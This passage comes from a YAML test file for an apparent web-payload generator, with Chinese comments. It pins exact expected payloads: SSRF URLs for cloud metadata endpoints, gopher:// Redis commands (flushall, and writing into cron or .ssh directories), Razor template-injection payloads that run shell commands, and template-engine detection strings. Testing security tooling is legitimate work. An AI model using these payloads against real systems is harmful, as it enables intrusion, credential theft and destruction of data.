      slots: {target: huawei}
      outputs: [raw]
    expect:
      # 华为云是 OpenStack 血统：路径是 openstack/latest/meta_data.json（下划线）
      payload: "http://169.254.169.254/openstack/latest/meta_data.json"

  - name: ssrf.generic.cloud.metadata · target=volc
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: volc}
      outputs: [raw]
    expect:
      # 火山引擎是 100.96.0.96，和阿里云的 100.100.100.200 差一位都不能混
      payload: "http://100.96.0.96/latest/meta-data/"

  - name: ssrf.generic.cloud.metadata · target=digitalocean
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: digitalocean}
      outputs: [raw]
    expect:
      payload: "http://169.254.169.254/metadata/v1/"

  # ================= ssrf.generic.scheme.gopher.redis · cmd =================
  # Redis 的写文件三步要按顺序来：dir → dbfilename → save。
  # 槽位只提供**单条命令**，顺序由用户自己串，所以这里钉的是每条命令的原始字节。
  # port 取默认 6379。

  - name: ssrf.generic.scheme.gopher.redis · cmd=flushall
    state:
      vuln: ssrf
      template: ssrf.generic.scheme.gopher.redis
      slots: {cmd: flushall}
      outputs: [raw]
    expect:
      # %0D%0A 是 body 自带的收尾，gopher 靠它把命令切出来
      payload: "gopher://127.0.0.1:6379/_flushall%0D%0A"

  - name: ssrf.generic.scheme.gopher.redis · cmd=info
    state:
      vuln: ssrf
      template: ssrf.generic.scheme.gopher.redis
      slots: {cmd: info}
      outputs: [raw]
    expect:
      payload: "gopher://127.0.0.1:6379/_info%0D%0A"

  - name: ssrf.generic.scheme.gopher.redis · cmd=dir_cron
    state:
      vuln: ssrf
      template: ssrf.generic.scheme.gopher.redis
      slots: {cmd: dir_cron}
      outputs: [raw]
    expect:
      # 空格已经手工编码成 %20，槽位里不能再出现裸空格
      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/spool/cron/%0D%0A"

  - name: ssrf.generic.scheme.gopher.redis · cmd=dir_ssh
    state:
      vuln: ssrf
      template: ssrf.generic.scheme.gopher.redis
      slots: {cmd: dir_ssh}
      outputs: [raw]
    expect:
      payload: "gopher://127.0.0.1:6379/_config%20set%20dir%20/root/.ssh/%0D%0A"

  - name: ssrf.generic.scheme.gopher.redis · cmd=filename
    state:
      vuln: ssrf
      template: ssrf.generic.scheme.gopher.redis
      slots: {cmd: filename}
      outputs: [raw]
    expect:
      # 落点是 crontab 时文件名必须是 root（不带路径），这条就是设它的
      payload: "gopher://127.0.0.1:6379/_config%20set%20dbfilename%20root%0D%0A"

  - name: ssrf.generic.scheme.gopher.redis · cmd=save
    state:
      vuln: ssrf
      template: ssrf.generic.scheme.gopher.redis
      slots: {cmd: save}
      outputs: [raw]
    expect:
      # 前两条只是改配置，不 save 不落盘——这条才是真正写文件的那一步
      payload: "gopher://127.0.0.1:6379/_save%0D%0A"

  # ================= ssti.dotnet.razor.rce · sh =================
  # Razor 里 Process.Start 的第二个参数是「一整个命令行串」，
  # 所以 flag 和 cmd 之间那**一个空格**是必须的，且它在 body 里、不在槽位里。

  - name: ssti.dotnet.razor.rce · sh=sh
    state:
      vuln: ssti
      component: razor
      template: ssti.dotnet.razor.rce
      slots: {sh: sh}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      payload: '@{ System.Diagnostics.Process.Start("/bin/sh", "-c whoami"); }'

  - name: ssti.dotnet.razor.rce · sh=cmd
    state:
      vuln: ssti
      component: razor
      template: ssti.dotnet.razor.rce
      slots: {sh: cmd}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      payload: '@{ System.Diagnostics.Process.Start("cmd.exe", "/c whoami"); }'

  # ================= ssti.generic.detect.arith · d =================
  # 五套定界符，open/close 必须配套。拆成两个独立槽位的后果在这里最直观：
  # 能拼出 `{{7*7}` 这种两边各自合法、合起来坏掉的串。

  - name: ssti.generic.detect.arith · d=jinja2
    state:
      vuln: ssti
      template: ssti.generic.detect.arith
      slots: {d: jinja2}
      outputs: [raw]
    expect:
      payload: "{{7*7}}"

  - name: ssti.generic.detect.arith · d=freemarker
    state:
      vuln: ssti
      template: ssti.generic.detect.arith
      slots: {d: freemarker}
      outputs: [raw]
    expect:
      payload: "${7*7}"

  - name: ssti.generic.detect.arith · d=erb
    state:
      vuln: ssti
      template: ssti.generic.detect.arith
      slots: {d: erb}
      outputs: [raw]
    expect:
      payload: "<%=7*7%>"

  - name: ssti.generic.detect.arith · d=smarty
    state:
      vuln: ssti
      template: ssti.generic.detect.arith
      slots: {d: smarty}
      outputs: [raw]
    expect:
      # 单花括号，没有百分号——手写时最容易顺手写成 <%= 或 {{
      payload: "{7*7}"

  - name: ssti.generic.detect.arith · d=thymeleaf
    state:
      vuln: ssti
      template: ssti.generic.detect.arith
      slots: {d: thymeleaf}
      outputs: [raw]
    expect:
      # Thymeleaf 预处理需要 __ 前后缀包住 ${ }
      payload: "__${7*7}__"

  # ================= ssti.generic.detect.str · d =================

  - name: ssti.generic.detect.str · d=jinja2
    state:
      vuln: ssti
      template: ssti.generic.detect.str
      slots: {d: jinja2}
      outputs: [raw]
    expect:
      payload: "{{7*'7'}}"

  - name: ssti.generic.detect.str · d=freemarker
    state:
      vuln: ssti
      template: ssti.generic.detect.str
      slots: {d: freemarker}
      outputs: [raw]
    expect:
